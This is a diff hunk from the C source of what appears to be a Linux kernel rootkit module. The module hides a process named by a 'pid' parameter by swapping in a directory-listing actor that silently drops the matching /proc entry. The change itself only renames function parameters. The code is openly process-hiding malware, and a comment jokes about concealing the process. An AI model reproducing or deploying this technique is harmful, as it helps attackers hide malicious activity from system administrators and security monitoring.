@@ -19,15 +19,16 @@ static char *pid = "-1";
 module_param(pid, charp, S_IRUSR | S_IWUSR);
 
 static int lkm_hide_pid_filldir_t(struct dir_context *ctx,
-				  const char *proc_name, int len, loff_t off,
-				  u64 ino, unsigned int d_type)
+				  const char *proc_name, int d_reclen,
+				  loff_t d_off, u64 d_ino, unsigned d_type)
 {
 	if (strncmp(proc_name, pid, strlen(pid)) == 0) {
 		/* someone wants to see this process :) */
 		return 0;
 	}
 
-	return old_ctx->actor(old_ctx, proc_name, len, off, ino, d_type);
+	return old_ctx->actor(old_ctx, proc_name, d_reclen, d_off, d_ino,
+			      d_type);
 }
 
 struct dir_context hide_pid_ctx = { .actor = lkm_hide_pid_filldir_t };
